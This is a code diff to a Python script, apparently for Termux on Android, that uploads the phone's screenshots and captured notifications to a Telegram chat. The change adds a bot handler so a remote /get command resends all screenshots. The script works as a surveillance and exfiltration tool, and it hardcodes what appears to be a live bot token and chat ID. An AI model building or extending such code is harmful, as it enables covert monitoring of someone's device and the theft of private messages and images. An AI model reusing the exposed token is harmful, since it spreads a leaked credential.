@@ -3,10 +3,13 @@ import time
 import requests
 import subprocess
 from datetime import datetime
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, CallbackContext
 
 # Telegram Bot API settings
 TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
 CHAT_ID = "5928551879"
+BOT_TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"  # Replace with your bot token
 
 # Directory where screenshots are saved
 SCREENSHOT_DIR = "/storage/emulated/0/Pictures/Screenshots/"
@@ -65,13 +68,13 @@ def update_sent_screenshots(screenshot_path):
     with open(LOG_FILE, 'a') as f:
         f.write(screenshot_path + "\n")
 
-def handle_get_command():
+def handle_get_command(update: Update, context: CallbackContext):
     """Send all screenshots again when the /get command is received."""
     screenshots = get_screenshots()
     if screenshots:
         for screenshot in screenshots:
             send_telegram_photo(screenshot)
-    send_telegram_message("All screenshots have been sent again.")
+        update.message.reply_text("All screenshots have been sent again.")
 
 def capture_notifications():
     """Capture notifications using termux-notification-list."""
@@ -94,6 +97,16 @@ def capture_notifications():
         print(f"Error capturing notifications: {e.output.decode()}")
 
 def main():
+    # Start the Telegram bot
+    updater = Updater(token=BOT_TOKEN, use_context=True)
+    dispatcher = updater.dispatcher
+
+    # Add /get command handler
+    dispatcher.add_handler(CommandHandler("get", handle_get_command))
+
+    # Start polling for Telegram commands
+    updater.start_polling()
+
     sent_screenshots = get_sent_screenshots()
     while True:
         if is_online():
@@ -113,12 +126,6 @@ def main():
                     update_sent_screenshots(screenshot)
                     print(f"Sending to Telegram: {screenshot}")
 
-            # Listen for /get command (placeholder for actual implementation)
-            # Replace this section with an actual Telegram bot handler.
-            command = input("Enter command (/get to resend all screenshots): ").strip()
-            if command == "/get":
-                handle_get_command()
-            
             # Wait before checking again
             time.sleep(2)  # Check every 2 seconds to see if online
 
